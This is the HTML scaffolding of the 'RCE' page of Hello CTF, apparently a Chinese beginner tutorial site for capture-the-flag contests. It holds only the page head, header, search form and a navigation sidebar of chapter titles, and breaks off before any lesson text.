
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
      
      
        <meta name="author" content="探姬">
      
      
        <link rel="canonical" href="https://hello-ctf.com/hc-web/rce/">
      
      
        <link rel="prev" href="../php_code_audit/">
      
      
        <link rel="next" href="../file_upload/">
      
      
        
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.3">
    
    
      
        <title>RCE - Hello CTF</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Noto Sans SC";--md-code-font:"Fira Code"}</style>
      
    
    
      <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.16.8/katex.min.css">
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
      <link rel="stylesheet" href="../../stylesheets/bannerSlider.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  

<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="blue">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#rce" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../.." title="Hello CTF" class="md-header__button md-logo" aria-label="Hello CTF" data-md-component="logo">
      
  <img src="../../assets/images/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Hello CTF
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              RCE
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/ProbiusOfficial/Hello-CTF" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    Hello-CTF
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../home/" class="md-tabs__link">
          
  
  
    
  
  Home

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../hc-tags/" class="md-tabs__link">
          
  
  
    
  
  知识点标签

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../Event/" class="md-tabs__link">
          
  
  
    
  
  赛事

        </a>
      </li>
    
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../hc-labs/" class="md-tabs__link">
        
  
  
    
  
  靶场

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../hc-toolkit/" class="md-tabs__link">
          
  
  
    
  
  工具

        </a>
      </li>
    
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../hc-archive/" class="md-tabs__link">
        
  
  
    
  
  归档

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Hello CTF" class="md-nav__button md-logo" aria-label="Hello CTF" data-md-component="logo">
      
  <img src="../../assets/images/logo.png" alt="logo">

    </a>
    Hello CTF
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/ProbiusOfficial/Hello-CTF" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    Hello-CTF
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../home/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Home
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-start/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    快速开始
  

    
  </span>
  
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    快速开始
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-preface/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    前言
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    前言
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-preface/about/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    关于本书
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-preface/usage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    食用方法
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-preface/join/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    加入我们
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_4" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-env/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    环境设置
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_4" id="__nav_1_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    环境设置
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-env/CTFtool/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    工具一览
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-env/Docker_On_Linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Docker环境
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-env/Crypto/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Crypto环境设置
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_5" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-misc/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    MISC | 杂项
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_5" id="__nav_1_5_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    MISC | 杂项
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/osint/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    信息收集
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/Encode_extra/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    编码扩展
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/file/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    文件基础
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/Archivefile/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    压缩包
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/stego/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    图片隐写
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/file_stego/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    文件隐写
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/audio_stego/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    音频隐写
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/pcap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    流量分析
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/industrial/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    工控类
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/memory/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    内存取证
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-misc/file_sign/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    附:文件签名表
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_6" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Web | 网络攻防
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_6" id="__nav_1_6_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_6_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_1_6">
            <span class="md-nav__icon md-icon"></span>
            
  
    Web | 网络攻防
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../web_start/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Web入门题单
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sensitive_info/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    敏感信息泄露
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../php_basic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PHP基础
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../php_unser_base/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PHP反序列化基础
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../php_features.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PHP特性
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sql_injection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SQL注入
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../xss/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    XSS攻击
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../include/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    文件包含
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssti/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SSTI注入
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../xxe.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    XXE注入
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssrf/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SSRF注入
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../php_code_audit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PHP 代码审计
  

    
  </span>
  
  

